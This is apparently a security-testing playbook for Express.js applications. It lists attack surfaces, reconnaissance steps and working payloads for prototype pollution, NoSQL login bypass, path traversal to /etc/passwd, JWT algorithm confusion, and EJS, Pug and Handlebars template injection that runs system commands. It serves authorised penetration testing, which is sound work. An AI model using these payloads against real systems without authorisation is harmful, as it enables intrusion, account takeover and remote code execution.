---
name: express
description: Security testing playbook for Express.js applications covering prototype pollution, middleware flaws, NoSQL injection, and template injection
mitre_techniques: [T1190]
kill_chain_phases: [initial_access]
---

# Express.js

Security testing for Express.js applications. Focus on prototype pollution, middleware ordering and bypass, NoSQL injection, JWT implementation flaws, and template engine injection across EJS/Pug/Handlebars.

## Attack Surface

**Core Components**
- Routing: `app.get/post/put/delete`, `Router()`, parameterized routes, regex routes, `app.all()`
- Middleware: `app.use()`, route-level middleware, error-handling middleware (4-arg), third-party middleware
- Template engines: EJS, Pug (Jade), Handlebars, Nunjucks — configurable via `app.set('view engine')`
- Static files: `express.static()`, `serve-static`, `send`, `sendFile`

**Data Handling**
- Body parsing: `express.json()`, `express.urlencoded()`, `multer` (multipart), `express.raw()`
- Query parsing: `qs` library (nested objects by default), `req.query`, `req.params`
- Cookies: `cookie-parser`, signed cookies, `express-session`
- Database: Mongoose (MongoDB), Sequelize, Knex, Prisma, raw driver queries

**Channels**
- HTTP, WebSocket (`ws`, `socket.io`), Server-Sent Events
- Worker threads, child processes, background job queues (Bull, Agenda)

**Deployment**
- Node.js direct, PM2, Docker, reverse proxy (Nginx/Caddy), serverless (Lambda + API Gateway)

## High-Value Targets

- Authentication endpoints: login, register, token refresh, password reset, OAuth callbacks
- Admin routes and dashboard middleware-gated paths
- File upload endpoints (`multer`), file download/serving endpoints
- API endpoints returning user data, especially with MongoDB (NoSQL injection surface)
- WebSocket endpoints sharing business logic with HTTP routes
- GraphQL endpoints (`/graphql`, `/graphiql`) if Apollo/express-graphql mounted
- Health/metrics endpoints (`/health`, `/metrics`, `/status`) leaking internals
- Debug/development routes left in production (`/debug`, `/test`, `/dev`)

## Reconnaissance

**Route Discovery**
```javascript
// If app object accessible (debug/error leak):
app._router.stack.map(r => r.route?.path).filter(Boolean)
```

- Fuzz common prefixes: `/api/v1/`, `/api/v2/`, `/internal/`, `/admin/`, `/debug/`
- Check `package.json` exposure: `GET /package.json`
- Source map files: `GET /dist/*.js.map`, `GET /build/*.js.map`
- Stack traces in error responses revealing file paths and middleware chain

**Header Fingerprinting**
- `X-Powered-By: Express` header (default, disabled by `helmet`)
- Missing security headers indicates no `helmet` middleware
- `ETag` format differences between Express versions

## Key Vulnerabilities

### Prototype Pollution

**Query String Pollution**
```
GET /api/users?__proto__[admin]=true
GET /api/users?constructor[prototype][admin]=true
```
- Express `qs` parser creates nested objects from query strings by default
- `req.query` can contain `__proto__` or `constructor.prototype` keys
- Polluted properties propagate to all objects sharing the prototype

**Body Pollution**
```json
{"__proto__": {"admin": true, "role": "superuser"}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
- `express.json()` parses these into objects that can pollute `Object.prototype`
- Libraries using `merge`, `extend`, `defaultsDeep` without prototype guards are exploitable
- Lodash `_.merge`, `_.defaultsDeep` (older versions) vulnerable

**Impact Chains**
- Bypass authorization: pollute `isAdmin`, `role`, `permissions` on prototype
- RCE via template engines: polluted `outputFunctionName` (EJS), `compileDebug` options
- DoS via polluted `toString` or `valueOf` causing type errors across the app

### Missing Security Headers (Helmet)

**Without Helmet**
- No `Content-Security-Policy`: XSS amplification
- No `X-Content-Type-Options`: MIME sniffing attacks
- No `X-Frame-Options`: clickjacking
- `X-Powered-By: Express` exposed: targeted attacks
- No `Strict-Transport-Security`: downgrade attacks
- No `Referrer-Policy`: referer leakage with tokens in URLs

### CORS Misconfiguration

**Permissive Patterns**
```javascript
// Vulnerable
app.use(cors({ origin: true }))                    // Reflects any origin
app.use(cors({ origin: /example/ }))               // Matches evil-example.com
app.use(cors({ origin: '*', credentials: true }))  // Invalid but may pass in some configs
```

- Origin reflection without validation: attacker's origin reflected in `Access-Control-Allow-Origin`
- Regex patterns matching substrings instead of full domains
- `credentials: true` with permissive origins enables cookie theft cross-origin
- Preflight caching enabling bypass of changed CORS policies

### NoSQL Injection (MongoDB)

**Operator Injection**
```json
// Login bypass
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": null}}

// Data extraction
{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
```

- `req.body` parsed as JSON passes objects directly to Mongoose queries
- `Model.findOne(req.body)` without schema validation allows operator injection
- `$where` operator enables JavaScript execution in MongoDB
- `$regex` for blind data extraction character by character

**Aggregation Injection**
- User-controlled `$lookup`, `$graphLookup` stages accessing unauthorized collections
- `$group` expressions with `$accumulator` enabling server-side JavaScript

### JWT Implementation Flaws

**Algorithm Confusion**
```javascript
// Vulnerable: accepts any algorithm
jwt.verify(token, publicKey)  // Attacker signs with HS256 using public key as secret

// Safe: pin algorithm
jwt.verify(token, publicKey, { algorithms: ['RS256'] })
```

**Common JWT Issues**
- `alg: "none"` accepted when library doesn't enforce algorithm
- Weak HMAC secrets brutable with `hashcat` or `jwt-cracker`
- Missing `exp` claim validation — tokens never expire
- `kid` header injection for key confusion or path traversal to known files
- Cross-service token reuse without audience/issuer validation

### Session Security

**Session Fixation**
- `express-session` with predictable session IDs or missing regeneration on login
- `req.session.regenerate()` not called after authentication
- `cookie.secure` not set — session cookies sent over HTTP

**Session Store Issues**
- `MemoryStore` in production (default): memory leak, lost on restart, not shared across instances
- Redis/Mongo store without TTL: sessions never expire server-side
- Missing `cookie.httpOnly`: session cookie accessible via JavaScript

### Path Traversal

**Static File Serving**
```
GET /static/../../../etc/passwd
GET /static/..%2f..%2f..%2fetc/passwd
GET /static/....//....//etc/passwd
```

- `express.static()` with misconfigured root or `dotfiles: 'allow'`
- `res.sendFile()` with user-controlled path without `root` option
- `res.download()` with unsanitized filename
- Null byte injection: `file.txt%00.html` (older Node versions)
- URL encoding bypass: `%2e%2e%2f` for `../`

### Template Injection

**EJS**
```
// Prototype pollution to RCE via EJS
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
```
- `<%= user_input %>` is escaped, but `<%- user_input %>` is raw
- Settings injection via prototype pollution: `outputFunctionName`, `escape`, `client`

**Pug (Jade)**
```
#{7*7}
- var x = process.mainModule.require('child_process').execSync('id')
```
- Unescaped interpolation: `!{user_input}`
- Code blocks if user controls template source

**Handlebars**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Middleware Order Issues

**Auth Bypass via Ordering**
```javascript
// Vulnerable: static files served before auth
app.use(express.static('public'))
app.use(authMiddleware)

// Files in public/ served without authentication
```

- Middleware registered after route handlers never executes for those routes
- Error-handling middleware (4-arg) must be last — if placed early, errors skip subsequent middleware
- `app.use('/api', auth)` doesn't protect `/api-internal` (prefix mismatch)
- Route-specific middleware vs global middleware gaps

### Regex DoS (ReDoS)

**Vulnerable Patterns**
```javascript
// Exponential backtracking
app.get(/\/api\/(.+)+\/data/, handler)
/^(a+)+$/              // Input: "aaaaaaaaaaaaaaaaab"
/(a|aa)+$/             // Input: "aaaaaaaaaaaaaaaaab"
```

- Custom route regexes with nested quantifiers
- User input validated with vulnerable regex patterns
- `path-to-regexp` library (used by Express) versions with ReDoS
- Validator libraries with complex regex patterns

### Trust Proxy Misconfiguration

**Header Spoofing**
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Proto: https
X-Forwarded-Host: admin.internal
```

- `app.set('trust proxy', true)` trusts all proxies — any client can spoof IP
- IP-based rate limiting bypassed via `X-Forwarded-For`
- Protocol detection (`req.protocol`) spoofable, affecting secure cookie enforcement
- `req.hostname` derived from `X-Forwarded-Host` enabling host header attacks

### Error Handling Information Disclosure

**Stack Trace Leakage**
- Default Express error handler returns stack traces in development
- `NODE_ENV` not set to `production` — verbose errors served to clients
- Custom error handlers logging/returning `err.stack`
- Unhandled promise rejections crashing with diagnostic output

## Bypass Techniques

- Content-type switching: `application/json` vs `application/x-www-form-urlencoded` hitting different parsers
- Parameter pollution: `?id=1&id=2` — `req.query.id` becomes array, breaking type checks
- Path normalization: trailing slashes, double slashes, encoded dots bypassing route matching
- Method override: `X-HTTP-Method-Override` if `method-override` middleware is installed
- Prototype pollution in query/body to inject properties checked by auth middleware
- Case sensitivity: Express routes are case-sensitive by default but middleware may not be

## Testing Methodology

1. **Enumerate** — Discover routes via fuzzing, source maps, `package.json`, error stack traces
2. **Header audit** — Check for helmet headers, `X-Powered-By`, CORS headers on all endpoints
3. **Prototype pollution** — Test query params and body with `__proto__` and `constructor.prototype` payloads
4. **NoSQL injection** — Send object/operator payloads to all MongoDB-backed endpoints
5. **JWT analysis** — Decode tokens, test algorithm confusion, brute-force weak secrets, check claims
6. **Middleware mapping** — Determine middleware order, test auth bypass via static routes and prefix mismatches
7. **Template probing** — Test reflected inputs for SSTI across detected template engine

## Validation Requirements

- Prototype pollution: polluted property visible in server behavior (auth bypass, config change, or RCE)
- NoSQL injection: operator payload returning unauthorized data or bypassing authentication
- JWT bypass: forged token accepted by the application (algorithm confusion, weak secret)
- Path traversal: file read outside static root via encoded or dot-segment paths
- SSTI: template injection confirmed with arithmetic output, escalated to config leak or RCE
- CORS: cross-origin request with credentials succeeding from attacker-controlled origin
- Middleware bypass: request reaching protected handler without auth due to ordering or prefix mismatch
